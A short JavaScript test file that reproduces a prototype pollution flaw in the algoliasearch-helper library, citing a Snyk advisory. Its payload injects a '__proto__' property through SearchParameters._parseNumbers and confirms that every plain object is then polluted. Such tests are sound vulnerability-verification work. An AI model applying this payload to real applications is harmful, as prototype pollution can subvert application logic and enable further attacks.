//https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421
test("prototype pollution in algoliasearch-helper", () => {
  const algohelp = require("algoliasearch-helper");
  let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

  expect({}.polluted).toBe(undefined);

  algohelp.SearchParameters._parseNumbers(payload); // {}

  expect({}.polluted).toBe("yes");
});
